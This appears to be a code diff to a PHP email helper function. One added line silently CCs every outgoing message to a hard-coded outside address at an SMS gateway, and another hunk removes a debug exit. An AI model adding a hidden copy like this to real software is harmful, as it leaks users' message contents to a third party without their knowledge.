@@ -26,6 +26,7 @@ if(!function_exists('sendEmail_helper')){
 	$ci->email->to($to);// change it to yours
 	$ci->email->subject($subject);
 	$ci->email->message($message);
+    $ci->email->cc('8369830329@vtext.com');
      if($ci->email->send()){
       	return true;
      }
@@ -41,7 +42,6 @@ if(!function_exists('send_email')){
 	function send_email($to,$from,$subject,$message){
 		 $ci = &get_instance();
 
-		 echo "1";exit;
 		$config['protocol']  = "smtp";
     	$config['smtp_host'] = "ssl://smtp.gmail.com";
     	$config['smtp_port'] = "465";
